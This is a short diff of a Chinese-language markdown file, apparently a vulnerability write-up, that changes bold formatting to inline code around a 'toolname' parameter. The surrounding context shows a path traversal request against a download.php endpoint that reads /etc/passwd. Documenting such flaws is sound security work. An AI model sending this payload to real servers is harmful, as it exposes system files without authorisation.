@@ -26,7 +26,7 @@
 
 
 
-任意点击后抓包，更改 **toolname** 参数
+任意点击后抓包，更改 `toolname` 参数
 
 ```plain
 /download.php?&class=vpn&toolname=../../../../../../../../etc/passwd
